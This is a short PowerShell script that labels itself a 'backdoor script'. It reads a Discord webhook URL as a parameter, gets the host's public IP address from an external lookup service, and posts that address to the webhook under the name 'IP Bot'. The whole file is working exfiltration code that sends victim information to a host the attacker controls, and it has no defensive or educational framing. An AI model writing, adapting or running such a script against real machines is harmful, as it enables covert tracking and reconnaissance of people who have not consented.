param (
    [String]$dc
)

Write-Output "Running backdoor script"
Write-Output "Webhook URL: $dc"

# Ensure the webhook URL is provided
if (-not $dc) {
    Write-Error "Webhook URL was not provided"
    exit
}

# Function to get the public IP address
function Get-PublicIp {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
        return $response.ip
    } catch {
        Write-Error "Error obtaining public IP address"
    }
}

# Function to send IP to Discord
function Send-ToDiscord($ip, $dc) {
    try {
        $postData = @{
            content = "IP: $ip"
            username = "IP Bot"
        }
        
        Invoke-RestMethod -Uri $dc -Method Post -Body ($postData | ConvertTo-Json) -ContentType "application/json"
    } catch {
        Write-Error "Error sending data to Discord"
    }
}

# Execute the functions
try {
    $publicIp = Get-PublicIp
    Send-ToDiscord -ip $publicIp -dc $dc
} catch {
    Write-Error "An error occurred during script execution"
}
